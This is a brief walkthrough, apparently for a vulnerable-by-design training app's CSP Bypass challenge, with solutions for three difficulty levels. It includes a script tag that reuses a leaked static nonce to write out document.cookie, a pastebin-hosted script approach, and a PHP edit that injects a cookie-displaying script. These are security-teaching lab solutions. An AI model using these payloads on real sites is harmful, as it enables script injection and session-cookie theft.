# CSP Bypass

## low

`https://pastebin.com/raw/WDaZpsXq`

There's been a security measure to prevent pastebin contents from getting
utilized by XSS. `pastebin.com` now responses with two additional headers, making this challenge impossible:

```
Content-Type: text/plain; charset=utf-8
X-Content-Type-Options: nosniff
```

If you really wanna try, intercept pastebin's response and delete `X-Content-Type-Options`.

## medium

`unsafe-inline` allows any inline script whose `nonce` is the same as the one in
CSP (to prove they were generated by server admin who has access to the site).

nonce = `base64('Never going to give you up')`

```
<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">document.write(document.cookie);</script>
```

## high

scenario of untrusted local files

modify `/vulnerabilities/csp/source/jsonp.php`


```php
//$outp = array ("answer" => "15");
//echo $callback . "(".json_encode($outp).")";

echo "document.getElementById(\"answer\").innerHTML = document.cookie;";
```
